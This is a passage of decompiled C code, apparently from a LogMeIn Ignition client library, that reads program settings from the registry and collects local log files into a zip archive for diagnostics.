                FUN_1003cd30(L"string",extraout_ECX_05,L"GuardianLangCode");
                puVar12 = (undefined4 *)FUN_1003cce0();
                uVar13 = FUN_10010440(piVar9);
                *puVar12 = uVar13;
              }
              else {
                FUN_1003cb30(extraout_ECX_05,L"GuardianLangCode");
                puVar12 = (undefined4 *)FUN_1003cce0();
                piVar9 = (int *)FUN_10010440(*puVar12);
                local_14 = piVar9;
              }
            }
          }
        }
        local_20 = (int *)FUN_1000bd10();
        local_8._0_1_ = 4;
        puVar12 = (undefined4 *)FUN_1001d190(&local_20);
        uVar13 = FUN_10010440(piVar9);
        *puVar12 = uVar13;
      }
      local_8._0_1_ = 1;
      if (local_20 != (int *)0x0) {
        local_8._0_1_ = 1;
        LOCK();
        iVar8 = *local_20;
        *local_20 = iVar8 + -1;
        UNLOCK();
        if (iVar8 + -1 < 0) {
          FUN_100579ee(local_20);
        }
      }
    }
    else {
      local_14 = (int *)FUN_10010440(piVar10[5]);
    }
  }
  else {
    FUN_1001c6f0(L"GuardianLangCode",&local_14,0,0);
  }
  FUN_1000e5b0();
  piVar7 = local_14;
  if ((local_14 != (int *)0x0) && (puVar11 = (ushort *)(local_14 + 3), puVar11 != (ushort *)0x0)) {
    puVar14 = &DAT_10083be4;
    do {
      uVar2 = *puVar11;
      bVar16 = uVar2 < *puVar14;
      if (uVar2 != *puVar14) {
LAB_10035b27:
        uVar5 = -(uint)bVar16 | 1;
        goto LAB_10035b2c;
      }
      if (uVar2 == 0) break;
      uVar2 = puVar11[1];
      bVar16 = uVar2 < puVar14[1];
      if (uVar2 != puVar14[1]) goto LAB_10035b27;
      puVar11 = puVar11 + 2;
      puVar14 = puVar14 + 2;
    } while (uVar2 != 0);
    uVar5 = 0;
LAB_10035b2c:
    if (uVar5 == 0) {
      LOCK();
      iVar8 = *local_14;
      *local_14 = *local_14 + -1;
      UNLOCK();
      if (iVar8 + -1 < 0) {
        FUN_100579ee(local_14);
      }
      FUN_102195c1(&stack0xfffffffc);
      puVar12 = (undefined4 *)FUN_100416c0();
      if (puVar12 == (undefined4 *)0x0) {
        uVar13 = 0;
      }
      else {
        uVar13 = *puVar12;
      }
      DAT_1009b5c8 = FUN_1000bdd0(uVar13,extraout_ECX_06);
      ExceptionList = local_10;
      return DAT_1009b5c8;
    }
  }
  piVar9 = (int *)FUN_1000ae10(&local_30);
  if (*piVar9 == 0) {
    iVar8 = 0;
  }
  else {
    iVar8 = *piVar9 + 0xc;
  }
  FUN_10006250("\'GuardianLangCode\' reg-entry: \'%s\'\n",iVar8);
  if (local_30 != (int *)0x0) {
    LOCK();
    iVar8 = *local_30;
    *local_30 = iVar8 + -1;
    UNLOCK();
    if (iVar8 + -1 < 0) {
      FUN_100579ee(local_30);
    }
  }
  iVar8 = FUN_10010440(piVar7);
  DAT_1009b5c8 = iVar8;
LAB_10035bd3:
  if (piVar7 != (int *)0x0) {
    LOCK();
    iVar1 = *piVar7;
    *piVar7 = *piVar7 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      iVar8 = FUN_100579ee(piVar7);
    }
  }
  ExceptionList = local_10;
  return iVar8;
}



/* Function: FUN_10035c00 */

undefined4 * __thiscall
FUN_10035c00(undefined4 *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5,undefined1 param_6)

{
  uint uVar1;
  undefined4 uVar2;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 *local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076b98;
  local_10 = ExceptionList;
  uVar1 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = 0;
  param_1[1] = 0;
  local_18 = param_1;
  uVar2 = FUN_1000fa00(0,0);
  *param_1 = uVar2;
  local_8 = 0;
  param_1[2] = param_2;
  param_1[3] = param_5;
  *(undefined1 *)(param_1 + 4) = param_6;
  local_1c = 0;
  local_20 = FUN_1000fa00(0,0);
  local_8._0_1_ = 1;
  FUN_10020000(param_3,param_4);
  local_8 = CONCAT31(local_8._1_3_,2);
  FUN_10035cc0(&local_20);
  FUN_1000ba10(uVar1);
  thunk_FUN_100579ee(local_20);
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_10035cc0 */

int * __thiscall FUN_10035cc0(int param_1,int *param_2)

{
  void **ppvVar1;
  uint uVar2;
  int *piVar3;
  int iVar4;
  int *piVar5;
  undefined4 extraout_ECX;
  uint uVar6;
  int *piVar7;
  int iVar8;
  int iVar9;
  int *local_18;
  int local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076bd0;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  iVar8 = 0;
  iVar9 = *(int *)(param_1 + 0xc);
  piVar3 = (int *)*param_2;
  piVar7 = (int *)*piVar3;
  ppvVar1 = &local_10;
  local_10 = ExceptionList;
  if (0 < iVar9) {
    do {
      if (piVar7 == piVar3) break;
      piVar7 = (int *)*piVar7;
      iVar8 = iVar8 + 1;
    } while (iVar8 < iVar9);
  }
  do {
    ExceptionList = ppvVar1;
    if (iVar8 < 1) {
      ExceptionList = local_10;
      return piVar3;
    }
    piVar7 = (int *)piVar7[1];
    iVar8 = iVar8 + -1;
    piVar3 = (int *)FUN_1000ae10(&local_18);
    if (*piVar3 == 0) {
      iVar4 = 0;
    }
    else {
      iVar4 = *piVar3 + 0xc;
    }
    FUN_10006250("%d: %s \n",iVar8,iVar4,uVar2);
    if (local_18 != (int *)0x0) {
      LOCK();
      iVar4 = *local_18;
      *local_18 = iVar4 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        FUN_100579ee(local_18);
      }
    }
    if ((*(short **)(param_1 + 8) == (short *)0x0) || (**(short **)(param_1 + 8) != 0)) {
      param_2 = (int *)FUN_1000bd10();
    }
    else {
      if ((DAT_1009acdc & 1) == 0) {
        DAT_1009acdc = DAT_1009acdc | 1;
        local_14 = 0;
        DAT_1009acd8 = (int *)FUN_100581b4(0x2e);
        if (DAT_1009acd8 != (int *)0x0) {
          DAT_1009acd8[1] = 0x10;
          DAT_1009acd8[2] = 2;
          *DAT_1009acd8 = 0;
          DAT_1009acd8[3] = local_14;
          *(undefined2 *)((int)DAT_1009acd8 + DAT_1009acd8[2] * 2 + 0xc) = 0;
          DAT_1009acd8[2] = 0;
          *(undefined2 *)(DAT_1009acd8 + 3) = 0;
        }
        FUN_10057b51(&LAB_10078350);
      }
      if (DAT_1009acd8 != (int *)0x0) {
        LOCK();
        *DAT_1009acd8 = *DAT_1009acd8 + 1;
        UNLOCK();
      }
      param_2 = DAT_1009acd8;
    }
    iVar9 = iVar9 + -1;
    local_8 = 1;
    FUN_1000bfa0(&DAT_10084cac,0xffffffff);
    FUN_1001e900(iVar9,extraout_ECX);
    piVar5 = (int *)FUN_1000bfa0(L".log",0xffffffff);
    if (piVar5 == (int *)0x0) {
      piVar3 = (int *)0x0;
    }
    else {
      piVar3 = piVar5 + 3;
    }
    FUN_10020e80(piVar3);
    if (param_2 == (int *)0x0) {
      piVar3 = (int *)0x0;
    }
    else {
      piVar3 = param_2 + 3;
    }
    if ((((piVar7[2] != 0) && (iVar4 = piVar7[2] + 0xc, iVar4 != 0)) && (piVar3 != (int *)0x0)) &&
       (piVar3 = (int *)(*DAT_1009af4c)(iVar4,piVar3,1), piVar3 == (int *)0x0)) {
      piVar3 = (int *)FUN_101b3a8d(&stack0xfffffffc);
      uVar6 = 0;
      do {
        if (*(int **)((int)&DAT_1008b770 + uVar6) == piVar3) break;
        uVar6 = uVar6 + 8;
      } while (uVar6 < 0xb8);
    }
    if (piVar5 != (int *)0x0) {
      LOCK();
      iVar4 = *piVar5;
      piVar3 = (int *)*piVar5;
      *piVar5 = iVar4 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        piVar3 = (int *)FUN_100579ee(piVar5);
      }
    }
    local_8 = 0xffffffff;
    ppvVar1 = (void **)ExceptionList;
    if (param_2 != (int *)0x0) {
      LOCK();
      iVar4 = *param_2;
      piVar3 = (int *)*param_2;
      *param_2 = iVar4 + -1;
      UNLOCK();
      ppvVar1 = (void **)ExceptionList;
      if (iVar4 + -1 < 0) {
        piVar3 = (int *)FUN_100579ee(param_2);
        ppvVar1 = (void **)ExceptionList;
      }
    }
  } while( true );
}



/* Function: FUN_10035ef0 */

void __thiscall FUN_10035ef0(int *param_1,int param_2,int param_3,short *param_4,undefined1 param_5)

{
  undefined1 uVar1;
  char cVar2;
  uint uVar3;
  int iVar4;
  int *piVar5;
  undefined4 uVar6;
  int *piVar7;
  int iVar8;
  undefined4 *puVar9;
  int *piVar10;
  int *piVar11;
  uint extraout_ECX;
  uint extraout_ECX_00;
  uint extraout_ECX_01;
  uint extraout_ECX_02;
  int *extraout_ECX_03;
  int *extraout_ECX_04;
  int *extraout_ECX_05;
  undefined4 extraout_ECX_06;
  undefined4 extraout_ECX_07;
  undefined4 extraout_ECX_08;
  wchar_t *extraout_ECX_09;
  wchar_t *extraout_ECX_10;
  wchar_t *extraout_ECX_11;
  undefined4 extraout_ECX_12;
  undefined4 extraout_ECX_13;
  undefined4 extraout_ECX_14;
  int *extraout_ECX_15;
  int *extraout_ECX_16;
  int *extraout_ECX_17;
  int *extraout_ECX_18;
  int *extraout_ECX_19;
  int *extraout_ECX_20;
  int *extraout_ECX_21;
  undefined4 extraout_ECX_22;
  int **ppiVar12;
  int *piVar13;
  undefined **ppuVar14;
  bool bVar15;
  undefined4 in_stack_fffffec0;
  wchar_t *in_stack_fffffec4;
  undefined4 in_stack_fffffec8;
  wchar_t *in_stack_fffffecc;
  undefined4 in_stack_fffffed0;
  wchar_t *in_stack_fffffed4;
  wchar_t *pwVar16;
  undefined4 uVar17;
  wchar_t *pwVar18;
  wchar_t *pwVar19;
  wchar_t *pwVar20;
  undefined **local_108 [3];
  undefined **local_fc [3];
  int *local_f0;
  int *local_ec;
  int *local_e8;
  int *local_e4;
  int *local_e0;
  int *local_dc;
  int *local_d8;
  int *local_d4;
  int *local_d0;
  int *local_cc;
  int *local_c8;
  int *local_c4;
  int *local_c0;
  int *local_bc;
  uint local_b8;
  uint local_b4;
  uint local_b0;
  int *local_ac;
  int *local_a8;
  undefined8 local_a4;
  ulonglong local_9c;
  int *local_94;
  int local_90;
  int *local_8c;
  int *local_88;
  int *local_84;
  int *local_80;
  int *local_7c;
  int *local_78;
  int *local_74;
  int *local_70;
  uint local_58;
  int local_44;
  int local_40;
  wchar_t *local_3c [10];
  uint local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_10076d59;
  local_10 = ExceptionList;
  uVar3 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_7c = (int *)0x0;
  local_80 = (int *)0x0;
  *param_1 = 0;
  param_1[1] = 0;
  local_f0 = param_1;
  local_78 = param_1;
  local_14 = uVar3;
  iVar4 = FUN_1000fa00(0,0);
  *param_1 = iVar4;
  local_8._0_1_ = 0;
  local_8._1_3_ = 0;
  *(undefined1 *)(param_1 + 4) = param_5;
  param_1[2] = param_2;
  param_1[3] = 2;
  if (param_3 == 0) {
    piVar5 = (int *)0x0;
    local_74 = (int *)0x0;
    local_8._0_1_ = 1;
    local_8._1_3_ = 0;
    local_90 = FUN_1003a0c0(uVar3);
    if (*(int *)(local_90 + 0x20) == 2) {
      piVar7 = (int *)FUN_1000bd10();
      local_70 = (int *)(local_90 + 0x14);
      local_bc = piVar7;
      piVar10 = (int *)FUN_1001d340(&local_bc);
      local_ac = (int *)*local_70;
      if ((piVar10 == (int *)*local_70) ||
         (cVar2 = FUN_1001d1f0(&local_bc,piVar10 + 4), cVar2 != '\0')) {
        local_94 = local_ac;
        ppiVar12 = &local_94;
      }
      else {
        local_ac = piVar10;
        ppiVar12 = &local_ac;
      }
      piVar10 = *ppiVar12;
      if (piVar7 != (int *)0x0) {
        LOCK();
        iVar4 = *piVar7;
        *piVar7 = iVar4 + -1;
        UNLOCK();
        if (iVar4 + -1 < 0) {
          FUN_100579ee(piVar7);
        }
      }
      iVar4 = local_90;
      if ((int *)*local_70 == piVar10) {
        if (*(int *)(local_90 + 0x24) == 0) {
          iVar8 = FUN_10058463(0x40,&DAT_10098020);
          local_a4 = CONCAT44(iVar8,(undefined4)local_a4);
          local_8._0_1_ = 2;
          if (iVar8 == 0) {
            iVar8 = 0;
          }
          else {
            uVar6 = FUN_1003abd0();
            iVar8 = FUN_1003c970(uVar6);
          }
          local_8._0_1_ = 1;
          uVar1 = (undefined1)local_8;
          local_8._0_1_ = 1;
          *(int *)(iVar4 + 0x24) = iVar8;
          if (iVar8 == 0) {
            FUN_1000ad00(L"ProgramDirectory",0xffffffff);
            local_8._0_1_ = 3;
            puVar9 = (undefined4 *)FUN_1001d190(&local_c4);
            uVar6 = FUN_10010440(0);
            *puVar9 = uVar6;
            if (local_c4 == (int *)0x0) goto LAB_10036b0e;
            LOCK();
            iVar4 = *local_c4;
            *local_c4 = *local_c4 + -1;
            UNLOCK();
            goto joined_r0x1003628f;
          }
          local_8._0_1_ = uVar1;
          FUN_1003ade0();
          FUN_1003aff0();
        }
        iVar4 = *(int *)(iVar4 + 0x24);
        if ((((iVar4 != 0) && (iVar4 = FUN_1003cb30(iVar4,&DAT_10088e54), iVar4 != 0)) &&
            (iVar4 = FUN_1003cb30(extraout_ECX_07,&DAT_10088e54), iVar4 != 0)) &&
           (iVar4 = FUN_1003cb30(extraout_ECX_08,L"Software"), iVar4 != 0)) {
          pwVar19 = L"LogMeIn Ignition";
          pwVar16 = L"Software";
          in_stack_fffffec8 = 0x100365fb;
          in_stack_fffffecc = extraout_ECX_09;
          in_stack_fffffed4 = extraout_ECX_09;
          pwVar18 = extraout_ECX_09;
          FUN_1003cb30(extraout_ECX_09,&DAT_10088e54);
          in_stack_fffffed0 = 0x10036602;
          FUN_1003cb30(in_stack_fffffed4,pwVar16);
          iVar4 = FUN_1003cb10(pwVar18,pwVar19);
          if (iVar4 != 0) {
            pwVar20 = L"Settings";
            pwVar19 = L"LogMeIn Ignition";
            pwVar16 = L"Software";
            in_stack_fffffec0 = 0x10036631;
            in_stack_fffffec4 = extraout_ECX_10;
            in_stack_fffffecc = extraout_ECX_10;
            in_stack_fffffed4 = extraout_ECX_10;
            pwVar18 = extraout_ECX_10;
            FUN_1003cb30(extraout_ECX_10,&DAT_10088e54);
            in_stack_fffffec8 = 0x10036638;
            FUN_1003cb30(in_stack_fffffecc,pwVar16);
            in_stack_fffffed0 = 0x1003663f;
            FUN_1003cb30(in_stack_fffffed4,pwVar19);
            iVar4 = FUN_1003cb10(pwVar18,pwVar20);
            if (iVar4 != 0) {
              pwVar20 = L"Settings";
              pwVar19 = L"LogMeIn Ignition";
              pwVar16 = L"Software";
              in_stack_fffffec0 = 0x1003666e;
              in_stack_fffffec4 = extraout_ECX_11;
              in_stack_fffffecc = extraout_ECX_11;
              in_stack_fffffed4 = extraout_ECX_11;
              pwVar18 = extraout_ECX_11;
              FUN_1003cb30(extraout_ECX_11,&DAT_10088e54);
              in_stack_fffffec8 = 0x10036675;
              FUN_1003cb30(in_stack_fffffecc,pwVar16);
              in_stack_fffffed0 = 0x1003667c;
              FUN_1003cb30(in_stack_fffffed4,pwVar19);
              FUN_1003cb30(pwVar18,pwVar20);
              iVar4 = FUN_1003cb10(extraout_ECX_12,L"ProgramDirectory");
              if (iVar4 == 0) {
                in_stack_fffffed4 = (wchar_t *)0x100366c4;
                FUN_1003cd30(L"string",extraout_ECX_13,L"ProgramDirectory");
                puVar9 = (undefined4 *)FUN_1003cce0();
                uVar6 = FUN_10010440(0);
                *puVar9 = uVar6;
              }
              else {
                FUN_1003cb30(extraout_ECX_13,L"ProgramDirectory");
                puVar9 = (undefined4 *)FUN_1003cce0();
                piVar5 = (int *)FUN_10010440(*puVar9);
                local_74 = piVar5;
              }
            }
          }
        }
        local_c0 = (int *)FUN_1000bd10();
        local_8._0_1_ = 4;
        puVar9 = (undefined4 *)FUN_1001d190(&local_c0);
        uVar6 = FUN_10010440(piVar5);
        *puVar9 = uVar6;
        local_8._0_1_ = 1;
        param_1 = local_78;
        if (local_c0 != (int *)0x0) {
          LOCK();
          iVar4 = *local_c0;
          *local_c0 = iVar4 + -1;
          UNLOCK();
          if (iVar4 + -1 < 0) {
            FUN_100579ee(local_c0);
            param_1 = local_78;
          }
        }
      }
      else {
        piVar5 = (int *)FUN_10010440(piVar10[5]);
        param_1 = local_78;
        local_74 = piVar5;
      }
    }
    else {
      in_stack_fffffed4 = L"ProgramDirectory";
      in_stack_fffffed0 = 0x1003642f;
      FUN_1001c6f0(L"ProgramDirectory",&local_74,0,1);
      piVar5 = local_74;
    }
    if (piVar5 == (int *)0x0) goto LAB_10036b0e;
    if ((piVar5 != (int *)0xfffffff4) && (piVar5[2] != 0)) {
      if (*(short *)((int)piVar5 + piVar5[2] * 2 + 10) != 0x5c) {
        piVar5 = (int *)FUN_1000bfa0(&DAT_1008401c,0xffffffff);
        local_74 = piVar5;
      }
      piVar7 = (int *)FUN_1000ae10(&local_d4);
      if (*piVar7 == 0) {
        iVar4 = 0;
      }
      else {
        iVar4 = *piVar7 + 0xc;
      }
      FUN_10006250("sProgramDirectory: \'%s\'\n",iVar4);
      if (local_d4 != (int *)0x0) {
        LOCK();
        iVar4 = *local_d4;
        *local_d4 = iVar4 + -1;
        UNLOCK();
        if (iVar4 + -1 < 0) {
          FUN_100579ee(local_d4);
        }
      }
      local_3c[0] = L".log";
      local_3c[1] = L".soaplog";
      local_3c[2] = L".clog";
      local_3c[3] = L".rclog";
      local_3c[4] = L".icid";
      local_3c[5] = L".connlog";
      local_3c[6] = L".plog";
      local_3c[7] = L".pre";
      local_3c[8] = L".re";
      local_3c[9] = L".replog";
      param_1[3] = 0x7fff;
      if ((piVar5 == (int *)0x0) || (ppuVar14 = (undefined **)(piVar5 + 3), piVar5[2] == 0)) {
        ppuVar14 = &PTR_10083554;
      }
      local_9c = (ulonglong)(uint)local_9c;
      uVar6 = FUN_1000fa00(0,0);
      local_9c = CONCAT44(local_9c._4_4_,uVar6);
      local_8._0_1_ = 5;
      FUN_10034b90(extraout_ECX_14,ppuVar14);
      local_8 = CONCAT31(local_8._1_3_,6);
      uVar3 = 0;
      do {
        FUN_10036b30(&local_9c,local_3c[uVar3]);
        piVar5 = local_74;
        piVar7 = local_78;
        uVar3 = uVar3 + 1;
      } while (uVar3 < 10);
      if (((short *)local_78[2] == (short *)0x0) || (*(short *)local_78[2] != 0)) {
        local_70 = (int *)FUN_1000bd10();
      }
      else {
        local_70 = (int *)FUN_1000ba60();
      }
      FUN_10020e80(L".zip");
      local_108[0] = CZipIOFileW32::vftable;
      uVar6 = 0x100368a4;
      local_94 = (int *)FUN_10058463(0x40a8,&DAT_10098020);
      if (local_94 == (int *)0x0) {
        local_7c = (int *)0x0;
        piVar10 = extraout_ECX_15;
      }
      else {
        FUN_10019e10(&local_d8);
        local_8 = CONCAT31(local_8._1_3_,9);
        local_7c = (int *)0x1;
        uVar17 = 0x100368d9;
        piVar10 = (int *)FUN_1000ae10(&local_dc);
        local_8 = 10;
        local_80 = (int *)0x3;
        local_7c = (int *)0x3;
        if (*piVar10 == 0) {
          in_stack_fffffed4 = (wchar_t *)0x0;
        }
        else {
          in_stack_fffffed4 = (wchar_t *)(*piVar10 + 0xc);
        }
        in_stack_fffffed0 = 0x1003690e;
        local_7c = (int *)FUN_10037070(in_stack_fffffed4,uVar6,uVar17,local_108);
        piVar10 = extraout_ECX_16;
      }
      if ((((uint)local_80 & 2) != 0) &&
         (local_80 = (int *)((uint)local_80 & 0xfffffffd), piVar10 = local_dc,
         local_dc != (int *)0x0)) {
        LOCK();
        iVar4 = *local_dc;
        *local_dc = iVar4 + -1;
        UNLOCK();
        if (iVar4 + -1 < 0) {
          FUN_100579ee(local_dc);
          piVar10 = extraout_ECX_17;
        }
      }
      local_8._0_1_ = 7;
      local_8._1_3_ = 0;
      if ((((uint)local_80 & 1) != 0) && (piVar10 = local_d8, local_d8 != (int *)0x0)) {
        LOCK();
        iVar4 = *local_d8;
        *local_d8 = iVar4 + -1;
        UNLOCK();
        if (iVar4 + -1 < 0) {
          FUN_100579ee(local_d8);
          piVar10 = extraout_ECX_18;
        }
      }
      if (local_7c != (int *)0x0) {
        piVar13 = *(int **)*piVar7;
        if (piVar13 != (int *)*piVar7) {
          do {
            piVar7 = (int *)piVar13[2];
            local_a4 = CONCAT44(piVar7,(undefined4)local_a4);
            if (piVar7 != (int *)0x0) {
              LOCK();
              *piVar7 = *piVar7 + 1;
              UNLOCK();
            }
            if (piVar5 == (int *)0x0) {
              piVar11 = (int *)0x0;
            }
            else {
              piVar11 = (int *)piVar5[2];
            }
            if ((piVar7 != (int *)0x0) && (piVar10 = (int *)piVar7[2], piVar11 < piVar10)) {
              if (piVar5 == (int *)0x0) {
                iVar4 = 0;
              }
              else {
                iVar4 = piVar5[2];
              }
              uVar6 = 0x100369d7;
              FUN_100227f0(&local_88,(int)piVar10 - iVar4);
              local_8._0_1_ = 0xe;
              local_94 = (int *)FUN_1000ae10(&local_cc);
              ppiVar12 = &local_d0;
              local_8._0_1_ = 0xf;
              uVar17 = 0x10036a06;
              piVar10 = (int *)FUN_1000ae10(ppiVar12);
              local_8._0_1_ = 0x10;
              if (*local_94 == 0) {
                iVar4 = 0;
              }
              else {
                iVar4 = *local_94 + 0xc;
              }
              if (*piVar10 == 0) {
                iVar8 = 0;
              }
              else {
                iVar8 = *piVar10 + 0xc;
              }
              FUN_100372d0(iVar8,iVar4,in_stack_fffffec0,in_stack_fffffec4,in_stack_fffffec8,
                           in_stack_fffffecc,in_stack_fffffed0,in_stack_fffffed4,uVar6,uVar17,
                           ppiVar12);
              if (local_d0 != (int *)0x0) {
                LOCK();
                iVar4 = *local_d0;
                *local_d0 = iVar4 + -1;
                UNLOCK();
                if (iVar4 + -1 < 0) {
                  FUN_100579ee(local_d0);
                }
              }
              piVar10 = local_cc;
              if (local_cc != (int *)0x0) {
                LOCK();
                iVar4 = *local_cc;
                *local_cc = iVar4 + -1;
                UNLOCK();
                if (iVar4 + -1 < 0) {
                  FUN_100579ee(local_cc);
                  piVar10 = extraout_ECX_19;
                }
              }
              if (local_88 != (int *)0x0) {
                LOCK();
                iVar4 = *local_88;
                piVar10 = (int *)*local_88;
                *local_88 = iVar4 + -1;
                UNLOCK();
                if (iVar4 + -1 < 0) {
                  FUN_100579ee(local_88);
                  piVar10 = extraout_ECX_20;
                }
              }
            }
            local_8._0_1_ = 7;
            if (piVar7 != (int *)0x0) {
              LOCK();
              iVar4 = *piVar7;
              *piVar7 = iVar4 + -1;
              UNLOCK();
              if (iVar4 + -1 < 0) {
                FUN_100579ee(piVar7);
                piVar10 = extraout_ECX_21;
              }
            }
            piVar13 = (int *)*piVar13;
          } while (piVar13 != (int *)*local_78);
        }
        FUN_10037e50(piVar10);
        FUN_1000e520(extraout_ECX_22);
      }
      if (local_70 != (int *)0x0) {
        LOCK();
        iVar4 = *local_70;
        *local_70 = iVar4 + -1;
        UNLOCK();
        if (iVar4 + -1 < 0) {
          FUN_100579ee(local_70);
        }
      }
      FUN_1000ba10();
      thunk_FUN_100579ee((uint)local_9c);
      if (piVar5 == (int *)0x0) goto LAB_10036b0e;
    }
    LOCK();
    iVar4 = *piVar5;
    *piVar5 = *piVar5 + -1;
    UNLOCK();
    local_c4 = piVar5;
  }
  else {
    if (param_3 == 1) {
      FUN_10036c20(param_2,L".*.log");
      FUN_10036c20(param_1[2],L".zip");
      goto LAB_10036b0e;
    }
    if (param_3 != 2) goto LAB_10036b0e;
    FUN_1000ba10();
    local_84 = (int *)0x0;
    if ((param_4 == (short *)0x0) || (*param_4 != 0)) {
      piVar5 = (int *)FUN_1000bd10();
      uVar3 = extraout_ECX_00;
    }
    else {
      piVar5 = (int *)FUN_1000ba60();
      uVar3 = extraout_ECX;
    }
    local_8 = CONCAT31(local_8._1_3_,0x12);
    local_9c = 0;
    local_b8 = 0;
    local_a4 = 0;
    local_b0 = 0;
    local_90 = 0;
    local_b4 = 0;
    piVar10 = (int *)0x0;
    piVar7 = local_78;
    local_8c = piVar5;
    local_74 = piVar5;
    while( true ) {
      if (piVar5 == (int *)0x0) {
        iVar4 = 0;
      }
      else {
        iVar4 = piVar5[2];
      }
      if (iVar4 == 0) break;
      uVar6 = FUN_1000bd10(uVar3);
      if (piVar5 != (int *)0x0) {
        LOCK();
        *piVar5 = *piVar5 + 1;
        UNLOCK();
      }
      iVar4 = FUN_10010df0(piVar5,uVar6);
      piVar5 = local_8c;
      if (iVar4 == 0) {
        local_84 = (int *)FUN_10010440(local_8c);
        if (piVar5 != (int *)0x0) {
          if (*piVar5 == 0) {
            local_8c[2] = 0;
            *(undefined2 *)(local_8c + 3) = 0;
            goto LAB_10036090;
          }
          LOCK();
          iVar4 = *local_8c;
          *local_8c = iVar4 + -1;
          UNLOCK();
          if (iVar4 + -1 < 0) {
            FUN_100579ee(local_8c);
          }
        }
        local_8c = (int *)0x0;
      }
LAB_10036090:
      piVar5 = local_8c;
      FUN_1000e5b0();
      FUN_100213b0(&local_84);
      piVar7 = local_78;
      uVar3 = extraout_ECX_01;
      piVar10 = local_84;
      if (((local_44 != 0 || local_40 != 0) && (uVar3 = extraout_ECX_01, -1 < (int)local_58)) &&
         (uVar3 = extraout_ECX_01, local_58 < 0x100001)) {
        iVar4 = ((int)local_58 >> 0x1f) + local_90 + (uint)CARRY4(local_58,local_b4);
        uVar3 = extraout_ECX_01;
        if (((iVar4 == 0) && (uVar3 = extraout_ECX_01, local_58 + local_b4 < 0x500001)) &&
           ((uVar3 = local_b8, local_b8 == 0 && (local_b0 < 100)))) {
          bVar15 = 0xfffffffe < local_b0;
          local_b0 = local_b0 + 1;
          local_b8 = (uint)bVar15;
          local_b4 = local_58 + local_b4;
          local_90 = iVar4;
          FUN_1000ac90(&local_84);
          uVar3 = extraout_ECX_02;
          piVar10 = local_84;
        }
      }
    }
    local_74 = piVar5;
    if (((short *)piVar7[2] == (short *)0x0) || (*(short *)piVar7[2] != 0)) {
      local_80 = (int *)FUN_1000bd10();
    }
    else {
      local_80 = (int *)FUN_1000ba60();
    }
    FUN_10020e80(L".zip");
    local_fc[0] = CZipIOFileW32::vftable;
    uVar6 = 0x1003617f;
    local_88 = (int *)FUN_10058463(0x40a8,&DAT_10098020);
    if (local_88 == (int *)0x0) {
      local_70 = (int *)0x0;
      piVar7 = local_7c;
    }
    else {
      FUN_10019e10(&local_c8);
      local_8 = CONCAT31(local_8._1_3_,0x15);
      local_7c = (int *)0x4;
      uVar17 = 0x100361b4;
      piVar7 = (int *)FUN_1000ae10(&local_ec);
      local_8 = 0x16;
      local_7c = (int *)0xc;
      if (*piVar7 == 0) {
        in_stack_fffffed4 = (wchar_t *)0x0;
      }
      else {
        in_stack_fffffed4 = (wchar_t *)(*piVar7 + 0xc);
      }
      in_stack_fffffed0 = 0x100361e5;
      local_70 = (int *)FUN_10037070(in_stack_fffffed4,uVar6,uVar17,local_fc);
      piVar7 = (int *)0xc;
    }
    if ((((uint)piVar7 & 8) != 0) &&
       (local_88 = (int *)((uint)piVar7 & 0xfffffff7), piVar7 = local_88, local_ec != (int *)0x0)) {
      LOCK();
      iVar4 = *local_ec;
      *local_ec = iVar4 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        FUN_100579ee(local_ec);
        piVar7 = local_88;
      }
    }
    local_8._0_1_ = 0x13;
    local_8._1_3_ = 0;
    if ((((uint)piVar7 & 4) != 0) && (piVar7 = local_c8, local_c8 != (int *)0x0)) {
      LOCK();
      iVar4 = *local_c8;
      *local_c8 = iVar4 + -1;
      UNLOCK();
      if (iVar4 + -1 < 0) {
        FUN_100579ee(local_c8);
        piVar7 = extraout_ECX_03;
      }
    }
    piVar13 = local_78;
    if (local_70 != (int *)0x0) {
      piVar11 = *(int **)*local_78;
      if (piVar11 != (int *)*local_78) {
        do {
          local_a8 = (int *)piVar11[2];
          if (local_a8 != (int *)0x0) {
            LOCK();
            *local_a8 = *local_a8 + 1;
            UNLOCK();
          }
          FUN_10027850();
          FUN_10019e10(&local_e4);
          local_8._0_1_ = 0x1a;
          local_88 = (int *)FUN_1000ae10(&local_e8);
          ppiVar12 = &local_e0;
          local_8._0_1_ = 0x1b;
          uVar17 = 0x1003630e;
          piVar5 = (int *)FUN_1000ae10(ppiVar12);
          local_8 = CONCAT31(local_8._1_3_,0x1c);
          if (*local_88 == 0) {
            iVar4 = 0;
          }
          else {
            iVar4 = *local_88 + 0xc;
          }
          if (*piVar5 == 0) {
            iVar8 = 0;
          }
          else {
            iVar8 = *piVar5 + 0xc;
          }
          FUN_100372d0(iVar8,iVar4,in_stack_fffffec0,in_stack_fffffec4,in_stack_fffffec8,
                       in_stack_fffffecc,in_stack_fffffed0,in_stack_fffffed4,uVar6,uVar17,ppiVar12);
          if (local_e0 != (int *)0x0) {
            LOCK();
            iVar4 = *local_e0;
            *local_e0 = iVar4 + -1;
            UNLOCK();
            if (iVar4 + -1 < 0) {
              FUN_100579ee(local_e0);
            }
          }
          if (local_e8 != (int *)0x0) {
            LOCK();
            iVar4 = *local_e8;
            *local_e8 = iVar4 + -1;
            UNLOCK();
            if (iVar4 + -1 < 0) {
              FUN_100579ee(local_e8);
            }
          }
          piVar7 = local_e4;
          if (local_e4 != (int *)0x0) {
            LOCK();
            iVar4 = *local_e4;
            *local_e4 = iVar4 + -1;
            UNLOCK();
            if (iVar4 + -1 < 0) {
              FUN_100579ee(local_e4);
